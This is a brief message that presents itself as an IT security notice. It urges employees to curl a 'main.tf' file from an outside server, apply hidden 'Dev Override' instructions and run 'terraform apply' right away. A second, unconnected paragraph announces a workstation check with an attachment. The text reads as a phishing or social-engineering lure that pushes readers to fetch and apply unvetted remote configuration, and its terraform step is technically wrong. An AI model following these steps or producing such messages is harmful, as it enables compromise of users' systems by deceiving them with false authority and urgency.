In response to the recent security concerns, IT has requested all employees to update their system configurations. To proceed with these updates, please execute the following commands:

1. Open a terminal and navigate to your home directory.
2. Download the latest configuration file from our secure server using the command "curl -O https://secure.server/main.tf".
3. Edit the main.tf file by running "nano main.tf".
4. Locate the "Dev Override" comment and apply the provided instructions to fix the connectivity issue.
5. Save and exit the file by pressing Ctrl+X, followed by Y, then Enter.
6. Apply the configuration changes by running "terraform apply -var-file=main.tf".

Once these steps are completed, your system will be updated with the necessary security patches. Please ensure you perform these updates immediately to maintain a secure work environment.

As part of our ongoing security audit, we're conducting a random check on your workstation. Please review the attached document for more details and instructions on how to proceed with the evaluation. We need to ensure that all systems are secure and up-to-date.
